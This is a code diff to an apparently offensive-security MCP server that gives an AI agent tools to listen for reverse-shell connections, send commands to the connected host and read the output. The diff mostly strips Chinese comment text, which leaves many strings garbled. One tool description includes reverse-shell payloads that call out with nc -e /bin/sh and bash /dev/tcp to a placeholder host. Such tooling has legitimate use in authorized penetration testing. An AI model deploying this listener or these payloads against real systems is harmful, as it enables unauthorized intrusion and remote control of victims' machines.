@@ -2,11 +2,11 @@
 """
 Reverse Shell MCP Server - Shell MCP 
 
- MCP Shell ：/、。
- CyberStrikeAI ，「 → MCP」 stdio 。
+ MCP Shell :/,.
+ CyberStrikeAI ," → MCP" stdio .
 
-：pip install mcp（ venv）
-：python mcp_reverse_shell.py python3 mcp_reverse_shell.py
+:pip install mcp( venv)
+:python mcp_reverse_shell.py python3 mcp_reverse_shell.py
 """
 
 from __future__ import annotations
@@ -20,7 +20,7 @@ from typing import Any
 from mcp.server.fastmcp import FastMCP
 
 # ---------------------------------------------------------------------------
-# Shell （：、）
+# Shell (:,)
 # ---------------------------------------------------------------------------
 
 _LISTENER: socket.socket | None = None
@@ -35,14 +35,14 @@ _LAST_LISTEN_ERROR: str | None = None
 _LISTENER_THREAD_JOIN_TIMEOUT = 1.0
 _START_READY_TIMEOUT = 1.5
 
-# send_command （）
+# send_command ()
 _END_MARKER = "__RS_DONE__"
 _RECV_TIMEOUT = 30.0
 _RECV_CHUNK = 4096
 
 
 def _get_local_ips() -> list[str]:
- """ IP （）， 127 。"""
+ """ IP (), 127 ."""
     ips: list[str] = []
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -66,7 +66,7 @@ def _get_local_ips() -> list[str]:
 
 
 def _accept_loop(port: int) -> None:
- """：bind、listen、accept，。"""
+ """:bind,listen,accept,."""
     global _LISTENER, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT, _LAST_LISTEN_ERROR
     sock: socket.socket | None = None
     try:
@@ -74,14 +74,14 @@ def _accept_loop(port: int) -> None:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(("0.0.0.0", port))
         sock.listen(1)
- # stop_listener accept() ：
+ # stop_listener accept() :
         sock.settimeout(0.5)
         with _LOCK:
             _LISTENER = sock
             _LISTENER_PORT = port
             _LAST_LISTEN_ERROR = None
             _READY_EVENT.set()
- # accept：， stop 
+ # accept:, stop 
         while not _STOP_EVENT.is_set():
             try:
                 client, addr = sock.accept()
@@ -113,9 +113,9 @@ def _start_listener(port: int) -> str:
     old_thread: threading.Thread | None = None
     with _LOCK:
         if _LISTENER is not None:
- # _LISTENER_PORT None（ stop/start），
+ # _LISTENER_PORT None( stop/start),
             show_port = _LISTENER_PORT if _LISTENER_PORT is not None else port
- return f"（: {show_port}）， stop_listener start。"
+ return f"(: {show_port}), stop_listener start."
         if _CLIENT_SOCK is not None:
             try:
                 _CLIENT_SOCK.close()
@@ -125,7 +125,7 @@ def _start_listener(port: int) -> str:
             _CLIENT_ADDR = None
         old_thread = _LISTENER_THREAD
 
- # ，
+ # ,
     if old_thread is not None and old_thread.is_alive():
         old_thread.join(timeout=0.5)
 
@@ -136,7 +136,7 @@ def _start_listener(port: int) -> str:
     th.start()
     _LISTENER_THREAD = th
 
- # bind/listen（）
+ # bind/listen()
     _READY_EVENT.wait(timeout=_START_READY_TIMEOUT)
     with _LOCK:
         err = _LAST_LISTEN_ERROR
@@ -146,15 +146,15 @@ def _start_listener(port: int) -> str:
         ips = _get_local_ips()
         addrs = ", ".join(f"{ip}:{port}" for ip in ips)
         return (
- f" 0.0.0.0:{port} 。"
- f": {addrs}（）。 reverse_shell_send_command 。"
+ f" 0.0.0.0:{port} ."
+ f": {addrs}(). reverse_shell_send_command ."
         )
 
     if err:
- return f"（0.0.0.0:{port}）：{err}"
+ return f"(0.0.0.0:{port}):{err}"
 
- # ：；
- return f"（0.0.0.0:{port}）。 reverse_shell_status ，。"
+ # :;
+ return f"(0.0.0.0:{port}). reverse_shell_status ,."
 
 
 def _stop_listener() -> str:
@@ -184,19 +184,19 @@ def _stop_listener() -> str:
         except OSError:
             pass
 
- # ， stop/start “ None ”
+ # , stop/start " None "
     if old_thread is not None and old_thread.is_alive():
         old_thread.join(timeout=_LISTENER_THREAD_JOIN_TIMEOUT)
     with _LOCK:
         _LISTENER_THREAD = None
- return "，（）。"
+ return ",()."
 
 
 def _disconnect_client() -> str:
     global _CLIENT_SOCK, _CLIENT_ADDR
     with _LOCK:
         if _CLIENT_SOCK is None:
- return "。"
+ return "."
         try:
             _CLIENT_SOCK.close()
         except OSError:
@@ -204,7 +204,7 @@ def _disconnect_client() -> str:
         addr = _CLIENT_ADDR
         _CLIENT_SOCK = None
         _CLIENT_ADDR = None
- return f" {addr}。"
+ return f" {addr}."
 
 
 def _status() -> dict[str, Any]:
@@ -227,12 +227,12 @@ def _status() -> dict[str, Any]:
 
 
 def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
- """（）。"""
+ """()."""
     global _CLIENT_SOCK, _CLIENT_ADDR
     with _LOCK:
         client = _CLIENT_SOCK
     if client is None:
- return "：。 start_listener， send_command。"
+ return ":. start_listener, send_command."
  # 
     wrapped = f"{command.strip()}\necho {_END_MARKER}\n"
     try:
@@ -269,22 +269,22 @@ def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
 
 app = FastMCP(
     name="reverse-shell",
- instructions=" Shell MCP： TCP ，。",
+ instructions=" Shell MCP: TCP ,.",
 )
 
 
 @app.tool(
- description=" Shell 。（ nc -e /bin/sh YOUR_IP PORT bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1）。。",
+ description=" Shell .( nc -e /bin/sh YOUR_IP PORT bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1)..",
 )
 def reverse_shell_start_listener(port: int) -> str:
     """Start reverse shell listener on the given port (e.g. 4444)."""
     if port < 1 or port > 65535:
- return " 1–65535 。"
+ return " 1–65535 ."
     return _start_listener(port)
 
 
 @app.tool(
- description=" Shell 。",
+ description=" Shell .",
 )
 def reverse_shell_stop_listener() -> str:
     """Stop the listener and disconnect the current client."""
@@ -292,7 +292,7 @@ def reverse_shell_stop_listener() -> str:
 
 
 @app.tool(
- description="：、、。",
+ description=":,,.",
 )
 def reverse_shell_status() -> str:
     """Get listener and client connection status."""
@@ -308,16 +308,16 @@ def reverse_shell_status() -> str:
 
 
 @app.tool(
- description=" Shell 。 start_listener 。",
+ description=" Shell . start_listener .",
 )
 async def reverse_shell_send_command(command: str) -> str:
     """Send a command to the connected reverse shell client and return output."""
- # socket I/O， MCP ， status/stop_listener 
+ # socket I/O, MCP , status/stop_listener 
     return await asyncio.to_thread(_send_command_blocking, command)
 
 
 @app.tool(
- description="，（）。",
+ description=",().",
 )
 def reverse_shell_disconnect() -> str:
     """Disconnect the current client without stopping the listener."""
